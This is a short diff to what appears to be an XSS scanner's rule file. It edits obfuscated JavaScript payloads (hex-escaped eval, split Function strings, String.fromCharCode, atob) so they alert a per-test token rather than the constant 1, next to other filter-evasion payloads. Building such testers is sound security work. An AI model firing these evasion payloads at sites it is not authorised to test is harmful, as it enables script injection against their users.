@@ -121,8 +121,8 @@ XSS_RULES: list[dict] = [
         "payload_templates": {
             "attack": [
                 "alert(1)",
-                "eval('\\x61lert\\x281\\x29')",
-                "Function('ale'+'rt(1)')()",
+                "eval('\\x61lert\\x28{token}\\x29')",
+                "Function('ale'+'rt({token})')()",
                 "setTimeout(alert,0,{token})",
                 "alert`1`",
                 "location='javascript:alert(1)'",
@@ -229,8 +229,8 @@ XSS_RULES: list[dict] = [
                 "<img src=x onerror=alert`1`>",
                 "<img src=x o/**/nerror=alert(1)>",
                 '<svg><script>alert&lpar;{token}&rpar;</script></svg>',
-                "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
-                "<script>eval(atob('YWxlcnQoMSk='))</script>",
+                "<script>eval(String.fromCharCode(97,108,101,114,116,40)+{token}+String.fromCharCode(41))</script>",
+                "<script>eval(atob('YWxlcnQo')+{token}+atob('KQ=='))</script>",
                 '<p onpointerover=alert(1)>hover me</p>',
                 "<img src=x onerror=alert(1) >",
             ],
